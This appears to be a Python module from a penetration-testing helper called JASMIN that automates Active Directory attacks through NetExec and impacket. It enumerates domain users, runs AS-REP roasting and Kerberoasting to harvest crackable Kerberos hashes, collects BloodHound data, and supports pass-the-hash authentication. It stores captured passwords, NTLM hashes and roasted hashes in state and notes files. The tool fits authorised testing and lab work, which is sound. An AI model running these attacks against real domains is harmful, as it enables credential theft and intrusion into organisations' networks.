#!/usr/bin/env python3

"""
ad_enum.py - Active Directory enumeration module for JASMIN
Enhanced with credential storage and selection integration
"""

import subprocess
import time
import threading
import shlex
import sys
import os
import re
import shutil
from pathlib import Path
from datetime import datetime

# INTELLIGENCE INTEGRATION - ADD THESE IMPORTS
try:
    from intelligence_integration import auto_analyze_scan_results
    INTEL_AVAILABLE = True
except ImportError:
    INTEL_AVAILABLE = False

# CREDENTIAL INTEGRATION
from state import load_state, append_to_state_list

def load_stored_credentials(outdir):
    """Load stored credentials from state.json"""
    try:
        state = load_state(Path(outdir))
        return state.get('credentials', [])
    except Exception as e:
        print(f"[!] Could not load stored credentials: {e}")
        return []

def save_credential(outdir, username, password_or_hash, use_hash, domain=None, source="AD Enumeration"):
    """Save credential to state.json and notes"""
    try:
        credential = {
            "service": "Active Directory",
            "username": username,
            "password": password_or_hash,
            "credential_type": "NTLM Hash" if use_hash else "Password",
            "domain": domain or "Unknown",
            "source": source,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M")
        }
        
        append_to_state_list(Path(outdir), "credentials", credential)
        
        # Also add to notes for visibility
        from notes import append_to_notes_section
        notes_file = Path(outdir) / f"{Path(outdir).name}_notes.txt"
        
        if use_hash:
            cred_line = f"- AD → {username}:{password_or_hash} (NTLM Hash)"
        else:
            cred_line = f"- AD → {username}:{password_or_hash}"
            
        if domain and domain != "Unknown":
            cred_line += f" [{domain}]"
            
        append_to_notes_section(notes_file, "[Credentials]:", cred_line)
        print(f"[+] Credential saved to state and notes")
        
    except Exception as e:
        print(f"[!] Could not save credential: {e}")

def select_credential(credentials, prompt_text="Select credential to use:"):
    """Display credentials and let user select one"""
    if not credentials:
        print("[!] No stored credentials available")
        return None
    
    print(f"\n{prompt_text}")
    print("=" * 50)
    
    for i, cred in enumerate(credentials, 1):
        # Format credential display
        username = cred.get('username', 'Unknown')
        service = cred.get('service', 'Unknown')
        cred_type = cred.get('credential_type', 'Password')
        domain = cred.get('domain', '')
        
        display_line = f"[{i}] {service} → {username}"
        if domain and domain != "Unknown":
            display_line += f" [{domain}]"
        display_line += f" ({cred_type})"
        
        print(display_line)
    
    print(f"[0] Enter new credentials manually")
    print("=" * 50)
    
    while True:
        try:
            choice = input(f"Select option (0-{len(credentials)}): ").strip()
            
            if choice == '0':
                return None  # User wants to enter manually
            
            idx = int(choice) - 1
            if 0 <= idx < len(credentials):
                selected = credentials[idx]
                print(f"[+] Using stored credential: {selected['username']}")
                return selected
            else:
                print(f"[!] Please enter a number between 0 and {len(credentials)}")
                
        except ValueError:
            print("[!] Please enter a valid number")
        except KeyboardInterrupt:
            print("\n[!] Cancelled")
            return None

def get_ad_credentials_enhanced(outdir):
    """Enhanced credential prompt with storage integration"""
    
    print(f"[*] Active Directory credentials required")
    
    # Load existing credentials
    stored_creds = load_stored_credentials(outdir)
    ad_creds = [cred for cred in stored_creds if 
                'Active Directory' in cred.get('service', '') or 
                'AD' in cred.get('service', '') or
                'Domain' in cred.get('service', '')]
    
    dc_ip = input("Domain Controller IP: ").strip()
    if not dc_ip:
        raise ValueError("Domain Controller IP is required")
    
    # Try to use stored credentials first
    selected_cred = None
    if ad_creds:
        print(f"\n[*] Found {len(ad_creds)} stored AD credentials")
        selected_cred = select_credential(ad_creds, "Select AD credential to use:")
    
    if selected_cred:
        username = selected_cred['username']
        password_or_hash = selected_cred['password']
        use_hash = selected_cred.get('credential_type') == 'NTLM Hash'
        
        return dc_ip, username, password_or_hash, use_hash, True  # True = using stored creds
    
    else:
        # Manual credential entry
        print(f"\n[*] Enter new credentials:")
        username = input("Username: ").strip() 
        if not username:
            raise ValueError("Username is required")
        
        auth_choice = input("Use (p)assword or (h)ash? ").strip().lower()
        
        if auth_choice == 'h':
            ntlm_hash = input("NTLM Hash: ").strip()
            if not ntlm_hash:
                raise ValueError("NTLM hash is required")
            return dc_ip, username, ntlm_hash, True, False  # False = new creds
        else:
            password = input("Password: ").strip()
            if not password:
                raise ValueError("Password is required")
            return dc_ip, username, password, False, False  # False = new creds

def offer_credential_save(outdir, username, password_or_hash, use_hash, domain=None):
    """Offer to save working credentials"""
    try:
        save_choice = input(f"\n[?] Save working credentials for {username}? (y/n): ").strip().lower()
        if save_choice == 'y':
            save_credential(outdir, username, password_or_hash, use_hash, domain, "AD Enumeration - Verified Working")
            return True
        return False
    except KeyboardInterrupt:
        print("\n[*] Skipping credential save")
        return False

def run_command(command, debug=False, always_show_output=False):
    """Execute subprocess command with optional output handling"""
    if debug:
        print(f"[+] Running: {command}")
    
    result = subprocess.run(
        shlex.split(command),
        capture_output=True,
        text=True
    )
    
    if (debug or always_show_output) and result.stdout:
        print(result.stdout)
    if (debug or always_show_output) and result.stderr:
        print(result.stderr, file=sys.stderr)

    return result.stdout.strip() if result.stdout else ""

def get_domain_name(dc_ip, username, password_or_hash, use_hash, debug=False):
    """Get domain name using nxc ldap"""
    print(f"[*] Discovering domain name...")
    
    cmd = ['nxc', 'ldap', dc_ip, '-u', username]
    if use_hash:
        cmd.extend(['-H', password_or_hash])
    else:
        cmd.extend(['-p', password_or_hash])

    if debug:
        print(f"[DEBUG] Running command: {' '.join(cmd)}")

    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, check=True)
        output = result.stdout
        if debug:
            print(output)
    except subprocess.CalledProcessError as e:
        print("[!] Failed to connect to domain controller")
        if debug:
            print(e.output)
        return None

    # Extract domain from output
    match = re.search(r'\(domain:([^\)]+)\)', output)
    if match:
        domain = match.group(1)
        print(f"[+] Domain discovered: {domain}")
        return domain
    else:
        print("[!] Domain not found in output")
        return None

def enumerate_domain_users(dc_ip, username, password_or_hash, use_hash, outdir, debug=False):
    """Enumerate domain users using nxc"""
    print(f"[*] Enumerating domain users...")
    
    base_cmd = ["nxc", "ldap", dc_ip, "-u", username]
    if use_hash:
        base_cmd += ["-H", password_or_hash]
    else:
        base_cmd += ["-p", password_or_hash]
    base_cmd += ["--users"]

    try:
        output = subprocess.check_output(base_cmd, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error enumerating users: {e.output}")
        return []

    if debug:
        print("[DEBUG] Raw output from nxc:")
        print(output)
        print("-" * 40)

    # Extract usernames from output
    usernames = []
    lines = output.splitlines()
    username_col_index = None
    start = False

    for line in lines:
        if "-Username-" in line:
            parts = re.split(r"\s{2,}", line)
            for i, part in enumerate(parts):
                if "-Username-" in part:
                    username_col_index = i
                    break
            start = True
            continue
        if start:
            if "Enumerated" in line:
                break
            parts = re.split(r"\s{2,}", line)
            if username_col_index is not None and len(parts) > username_col_index:
                pre_col_index = username_col_index - 1
                if pre_col_index >= 0 and parts[pre_col_index].strip().lower() != "guest":
                    username = parts[username_col_index].strip()
                    usernames.append(username)

    if usernames:
        users_file = outdir / "ad_users.txt"
        with open(users_file, "w") as f:
            f.write("\n".join(usernames))
        print(f"[+] Extracted {len(usernames)} usernames to {users_file}")
    else:
        print("[!] No usernames found")
    
    return usernames

def check_password_policy(dc_ip, username, password_or_hash, use_hash, debug=False):
    """Check domain password policy using nxc"""
    print(f"[*] Checking password policy...")
    
    auth_arg = password_or_hash
    if use_hash:
        cmd = ["nxc", "smb", dc_ip, "-u", username, "-H", auth_arg, "--pass-pol"]
    else:
        cmd = ["nxc", "smb", dc_ip, "-u", username, "-p", auth_arg, "--pass-pol"]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.stdout:
            print(result.stdout)
        if result.stderr:
            print(result.stderr)
    except Exception as e:
        print(f"[!] Error checking password policy: {e}")

def asrep_roast_users(domain, dc_ip, users_file, outdir, debug=False):
    """Perform AS-REP roasting on discovered users"""
    if not os.path.isfile(users_file):
        print(f"[!] User file '{users_file}' not found.")
        return
    
    print(f"[*] Starting AS-REP roasting...")

    try:
        with open(users_file, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f'[!] Error reading user file: {e}')
        return

    roasted_hashes = []

    for user in users:
        cmd = [
            'impacket-GetNPUsers',
            f'{domain}/{user}',
            '-request',
            '-no-pass',
            '-dc-ip', dc_ip
        ]
        if debug:
            print(f'[*] Running: {" ".join(cmd)}')
        
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        if debug:
            print(result.stdout)

        for line in result.stdout.splitlines():
            if line.strip().startswith('$krb5asrep$'):
                roasted_hashes.append(line.strip())

    if roasted_hashes:
        asrep_file = outdir / "asrep_hashes.txt"
        with open(asrep_file, 'w') as f:
            f.write('\n'.join(roasted_hashes))
        print(f'[+] {len(roasted_hashes)} AS-REP hash(es) saved to {asrep_file}')
        
        # Offer to save discovered hashes as potential credentials
        print(f"\n[*] Found {len(roasted_hashes)} AS-REP roastable hash(es):")
        for i, hash_line in enumerate(roasted_hashes[:3], 1):  # Show first 3
            # Extract username from hash
            try:
                username = hash_line.split('$')[3]
                print(f"  {i}. {username}")
            except:
                print(f"  {i}. Hash {i}")
        
        if len(roasted_hashes) > 3:
            print(f"  ... and {len(roasted_hashes) - 3} more")
            
        save_choice = input(f"\n[?] Mark these as potential crackable credentials? (y/n): ").strip().lower()
        if save_choice == 'y':
            for hash_line in roasted_hashes:
                try:
                    username = hash_line.split('$')[3]
                    save_credential(outdir, username, hash_line, True, domain, "AS-REP Roasting - Needs Cracking")
                except:
                    pass
    else:
        print('[-] No AS-REP roastable users found')

def kerberoast_users(domain, dc_ip, username, password_or_hash, use_hash, outdir, debug=False):
    """Perform Kerberoasting"""
    print(f"[*] Starting Kerberoasting...")
    
    if use_hash:
        cmd = f"impacket-GetUserSPNs -request -dc-ip {dc_ip} {domain}/{username} -hashes :{password_or_hash}"
    else:
        cmd = f"impacket-GetUserSPNs -request -dc-ip {dc_ip} {domain}/{username}:{password_or_hash}"
    
    result = subprocess.run(shlex.split(cmd), capture_output=True, text=True)
    
    if debug or result.stdout:
        print(result.stdout)
    if result.stderr:
        print(result.stderr)
    
    # Look for Kerberos hashes in output
    kerberos_hashes = []
    for line in result.stdout.splitlines():
        if line.strip().startswith('$krb5tgs$'):
            kerberos_hashes.append(line.strip())
    
    if kerberos_hashes:
        kerb_file = outdir / "kerberoast_hashes.txt"
        with open(kerb_file, 'w') as f:
            f.write('\n'.join(kerberos_hashes))
        print(f'[+] {len(kerberos_hashes)} Kerberoast hash(es) saved to {kerb_file}')
        
        # Offer to save discovered hashes as potential credentials  
        print(f"\n[*] Found {len(kerberos_hashes)} Kerberoastable hash(es):")
        for i, hash_line in enumerate(kerberos_hashes[:3], 1):  # Show first 3
            try:
                # Extract service account name from hash
                parts = hash_line.split('$')
                if len(parts) > 3:
                    service_info = parts[3]
                    print(f"  {i}. {service_info}")
                else:
                    print(f"  {i}. Hash {i}")
            except:
                print(f"  {i}. Hash {i}")
        
        if len(kerberos_hashes) > 3:
            print(f"  ... and {len(kerberos_hashes) - 3} more")
            
        save_choice = input(f"\n[?] Mark these as potential crackable credentials? (y/n): ").strip().lower()
        if save_choice == 'y':
            for hash_line in kerberos_hashes:
                try:
                    # Extract service account name
                    parts = hash_line.split('$')
                    service_account = parts[3] if len(parts) > 3 else f"ServiceAccount_{len(kerberos_hashes)}"
                    save_credential(outdir, service_account, hash_line, True, domain, "Kerberoasting - Needs Cracking")
                except:
                    pass
    else:
        print('[-] No Kerberoastable users found')

def collect_bloodhound_data(dc_ip, username, password_or_hash, use_hash, outdir, debug=False):
    """Collect BloodHound data using nxc"""
    print(f"[*] Collecting BloodHound data...")
    
    command = ['nxc', 'ldap', dc_ip, '-u', username, '--bloodhound', '--collection', 'All', '--dns-server', dc_ip]
    
    if use_hash:
        command.extend(['-H', password_or_hash])
    else:
        command.extend(['-p', password_or_hash])

    if debug:
        print(f"Running command: {' '.join(command)}")

    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        output = result.stdout
        if debug:
            print(output)

        # Extract the path after the "Compressing output into " text
        match = re.search(r"Compressing output into (.+\.zip)", output)
        if match:
            output_path = match.group(1)
            print(f"[+] BloodHound data collected: {output_path}")
            
            # Move the file to the box directory
            if os.path.exists(output_path):
                dest_path = outdir / 'bloodhound.zip'
                shutil.move(output_path, dest_path)
                print(f"[+] Moved BloodHound data to {dest_path}")
            else:
                print(f"[!] BloodHound file not found: {output_path}")
        else:
            print("[!] Could not locate BloodHound output file")

    except subprocess.CalledProcessError as e:
        print(f"[!] Error collecting BloodHound data: {e}")
        if debug:
            print(e.stderr)

def update_ad_notes(outdir, boxname, domain=None, users_count=0, asrep_count=0, kerb_count=0, bloodhound_collected=False):
    """Update notes with AD enumeration findings"""
    
    # Determine notes file path
    notes_file = outdir / f"{boxname}_notes.txt"
    
    # Read existing notes
    notes_content = ""
    if notes_file.exists():
        with open(notes_file, 'r') as f:
            notes_content = f.read()
    
    # Check if AD section exists
    if "[Active Directory]:" not in notes_content:
        # Add AD section to notes
        ad_section = f"""
[Active Directory]:
Domain: {domain if domain else 'Unknown'}
Users Enumerated: {users_count}
AS-REP Roastable: {asrep_count}
Kerberoastable: {kerb_count}
BloodHound: {'Collected' if bloodhound_collected else 'Not collected'}

"""
        with open(notes_file, 'a') as f:
            f.write(ad_section)
        print(f"[+] Updated notes with AD enumeration results")

# Main AD enumeration functions for JASMIN integration

def ad_enum_full(env, subargs):
    """Full AD enumeration - equivalent to enum-AD script"""
    if not env or 'IP' not in env:
        print("[!] No active session.")
        return
    
    try:
        # Get credentials (enhanced with storage integration)
        dc_ip, username, password_or_hash, use_hash, using_stored = get_ad_credentials_enhanced(env['OUTDIR'])
        
        # Override DC IP if different from session IP
        if dc_ip != env['IP']:
            print(f"[*] Using DC IP {dc_ip} (different from session IP {env['IP']})")
        
        outdir = Path(env['OUTDIR'])
        logfile = Path(env['LOGFILE'])
        boxname = env['BOXNAME']
        debug = "--debug" in subargs
        
        print(f"[*] Starting full AD enumeration on {dc_ip}...")
        
        # Start BloodHound collection in background
        bh_thread = threading.Thread(
            target=collect_bloodhound_data, 
            args=(dc_ip, username, password_or_hash, use_hash, outdir, debug)
        )
        bh_thread.start()
        
        start_time = time.time()
        
        # Step 1: Get domain name
        domain = get_domain_name(dc_ip, username, password_or_hash, use_hash, debug)
        if not domain:
            print("[!] Could not determine domain name. Continuing with enumeration...")
            domain = "UNKNOWN"
        else:
            # Offer to save working credentials if not using stored ones
            if not using_stored:
                offer_credential_save(outdir, username, password_or_hash, use_hash, domain)
        
        # Step 2: Enumerate users
        users = enumerate_domain_users(dc_ip, username, password_or_hash, use_hash, outdir, debug)
        users_file = outdir / "ad_users.txt"
        
        # Step 3: Check password policy
        check_password_policy(dc_ip, username, password_or_hash, use_hash, debug)
        
        # Step 4: AS-REP Roasting (if users found)
        asrep_count = 0
        if users and users_file.exists():
            asrep_roast_users(domain, dc_ip, users_file, outdir, debug)
            asrep_file = outdir / "asrep_hashes.txt"
            if asrep_file.exists():
                with open(asrep_file, 'r') as f:
                    asrep_count = len([line for line in f if line.strip()])
        
        # Step 5: Kerberoasting
        kerb_count = 0
        kerberoast_users(domain, dc_ip, username, password_or_hash, use_hash, outdir, debug)
        kerb_file = outdir / "kerberoast_hashes.txt"
        if kerb_file.exists():
            with open(kerb_file, 'r') as f:
                kerb_count = len([line for line in f if line.strip()])
        
        # Wait for BloodHound to complete
        print(f"[*] Waiting for BloodHound collection to complete...")
        bh_thread.join()
        bloodhound_collected = (outdir / "bloodhound.zip").exists()
        
        elapsed = time.time() - start_time
        print(f"[+] Full AD enumeration completed in {elapsed/60:.1f} minutes")
        
        # Update notes
        update_ad_notes(outdir, boxname, domain, len(users), asrep_count, kerb_count, bloodhound_collected)
        
        # Log completion
        with open(logfile, "a") as f:
            timestamp = datetime.now().strftime("%F %T")
            f.write(f"[{timestamp}] AD enumeration completed on {dc_ip} in {elapsed/60:.1f} minutes\n")
        
        # Intelligence Analysis Integration (if available)
        if INTEL_AVAILABLE:
            try:
                auto_analyze_scan_results(env)
            except Exception as e:
                print(f"[!] Intelligence analysis failed: {e}")
                
    except ValueError as e:
        print(f"[!] {e}")
    except KeyboardInterrupt:
        print("\n[!] AD enumeration interrupted by user")
    except Exception as e:
        print(f"[!] AD enumeration failed: {e}")

def ad_enum_users(env, subargs):
    """Enumerate domain users only"""
    if not env or 'IP' not in env:
        print("[!] No active session.")
        return
    
    try:
        dc_ip, username, password_or_hash, use_hash, using_stored = get_ad_credentials_enhanced(env['OUTDIR'])
        outdir = Path(env['OUTDIR'])
        debug = "--debug" in subargs
        
        users = enumerate_domain_users(dc_ip, username, password_or_hash, use_hash, outdir, debug)
        
        if users:
            print(f"[+] Found {len(users)} domain users")
            for user in users[:10]:  # Show first 10
                print(f"  - {user}")
            if len(users) > 10:
                print(f"  ... and {len(users) - 10} more")
                
            # Offer to save working credentials if not using stored ones
            if not using_stored:
                domain = get_domain_name(dc_ip, username, password_or_hash, use_hash, debug)
                offer_credential_save(outdir, username, password_or_hash, use_hash, domain)
        
    except ValueError as e:
        print(f"[!] {e}")
    except Exception as e:
        print(f"[!] User enumeration failed: {e}")

def ad_bloodhound(env, subargs):
    """Collect BloodHound data only"""
    if not env or 'IP' not in env:
        print("[!] No active session.")
        return
    
    try:
        dc_ip, username, password_or_hash, use_hash, using_stored = get_ad_credentials_enhanced(env['OUTDIR'])
        outdir = Path(env['OUTDIR'])
        debug = "--debug" in subargs
        
        collect_bloodhound_data(dc_ip, username, password_or_hash, use_hash, outdir, debug)
        
        # Offer to save working credentials if not using stored ones
        if not using_stored:
            domain = get_domain_name(dc_ip, username, password_or_hash, use_hash, debug)
            offer_credential_save(outdir, username, password_or_hash, use_hash, domain)
        
    except ValueError as e:
        print(f"[!] {e}")
    except Exception as e:
        print(f"[!] BloodHound collection failed: {e}")

def ad_kerberos(env, subargs):
    """Perform Kerberos attacks only (AS-REP + Kerberoasting)"""
    if not env or 'IP' not in env:
        print("[!] No active session.")
        return
    
    try:
        dc_ip, username, password_or_hash, use_hash, using_stored = get_ad_credentials_enhanced(env['OUTDIR'])
        outdir = Path(env['OUTDIR'])
        debug = "--debug" in subargs
        
        # Get domain name first
        domain = get_domain_name(dc_ip, username, password_or_hash, use_hash, debug)
        if not domain:
            print("[!] Could not determine domain name")
            return
        
        # Offer to save working credentials if not using stored ones
        if not using_stored:
            offer_credential_save(outdir, username, password_or_hash, use_hash, domain)
        
        # Need users for AS-REP roasting - enumerate them first
        print(f"[*] Enumerating users for Kerberos attacks...")
        users = enumerate_domain_users(dc_ip, username, password_or_hash, use_hash, outdir, debug)
        users_file = outdir / "ad_users.txt"
        
        if users and users_file.exists():
            # AS-REP Roasting
            asrep_roast_users(domain, dc_ip, users_file, outdir, debug)
        
        # Kerberoasting
        kerberoast_users(domain, dc_ip, username, password_or_hash, use_hash, outdir, debug)
        
    except ValueError as e:
        print(f"[!] {e}")
    except Exception as e:
        print(f"[!] Kerberos attacks failed: {e}")

def ad_policy(env, subargs):
    """Check domain password policy only"""
    if not env or 'IP' not in env:
        print("[!] No active session.")
        return
    
    try:
        dc_ip, username, password_or_hash, use_hash, using_stored = get_ad_credentials_enhanced(env['OUTDIR'])
        outdir = Path(env['OUTDIR'])  # ADD THIS LINE
        debug = "--debug" in subargs
        
        check_password_policy(dc_ip, username, password_or_hash, use_hash, debug)
        
        # Offer to save working credentials if not using stored ones
        if not using_stored:
            domain = get_domain_name(dc_ip, username, password_or_hash, use_hash, debug)
            offer_credential_save(outdir, username, password_or_hash, use_hash, domain)
        
    except ValueError as e:
        print(f"[!] {e}")
    except Exception as e:
        print(f"[!] Password policy check failed: {e}")

def ad_help(env, subargs):
    """Show Active Directory help menu"""
    print("""
🏰 ACTIVE DIRECTORY ENUMERATION COMMANDS

Available AD Commands:
  ad enum                   - Full AD enumeration workflow
                             (BloodHound + users + Kerberos + policy)
  ad users                  - Enumerate domain users only
  ad bloodhound             - Collect BloodHound data only  
  ad kerberos               - Kerberos attacks (AS-REP + Kerberoasting)
  ad policy                 - Check domain password policy only
  ad help                   - Show this help menu

Flags:
  --debug                   - Show detailed command output

🔑 CREDENTIAL INTEGRATION:
  • JASMIN will show stored AD credentials if available
  • Select from existing creds or enter new ones manually
  • Working credentials are automatically offered for storage
  • Discovered hashes are offered as potential crackable creds
  • All credentials stored in state.json and notes

Authentication Support:
  • Password authentication (-p)
  • NTLM hash authentication (-H)
  • Domain Controller IP can differ from session IP

Examples:
  ad enum                   # Full enumeration (will show stored creds)
  ad users --debug          # Enumerate users with debug output
  ad bloodhound             # Just collect BloodHound data
  ad kerberos               # Just run Kerberos attacks

Output Files (saved to current box directory):
  • ad_users.txt           - Enumerated domain users
  • bloodhound.zip         - BloodHound collection data
  • asrep_hashes.txt       - AS-REP roastable hashes (if found)
  • kerberoast_hashes.txt  - Kerberoastable hashes (if found)

Required Tools:
  • nxc (NetExec)
  • impacket-GetNPUsers
  • impacket-GetUserSPNs

Notes:
  • Results automatically added to notes file
  • Commands respect current JASMIN session context
  • Credentials stored securely in session state
  • Hash discoveries offered as potential crack targets
""")
    return env

def ad_creds(env, subargs):
    """Show and manage stored AD credentials"""
    if not env or 'OUTDIR' not in env:
        print("[!] No active session.")
        return
    
    try:
        outdir = Path(env['OUTDIR'])
        stored_creds = load_stored_credentials(outdir)
        ad_creds = [cred for cred in stored_creds if 
                    'Active Directory' in cred.get('service', '') or 
                    'AD' in cred.get('service', '') or
                    'Domain' in cred.get('service', '')]
        
        if not ad_creds:
            print("[!] No stored AD credentials found")
            print("[*] Use 'ad enum' or other AD commands to authenticate and store credentials")
            return
        
        print(f"\n🔑 STORED AD CREDENTIALS ({len(ad_creds)} found)")
        print("=" * 60)
        
        for i, cred in enumerate(ad_creds, 1):
            username = cred.get('username', 'Unknown')
            cred_type = cred.get('credential_type', 'Password')
            domain = cred.get('domain', 'Unknown')
            source = cred.get('source', 'Unknown')
            timestamp = cred.get('timestamp', 'Unknown')
            
            print(f"[{i}] {username}@{domain}")
            print(f"    Type: {cred_type}")
            print(f"    Source: {source}")
            print(f"    Added: {timestamp}")
            print()
            
        # Show management options
        print("Management Options:")
        print("  • Use 'notes creds' to add manual credentials")
        print("  • Credentials auto-saved during successful AD enumeration")
        print("  • Hash discoveries offered for storage during attacks")
        
    except Exception as e:
        print(f"[!] Error displaying credentials: {e}")
    
    return env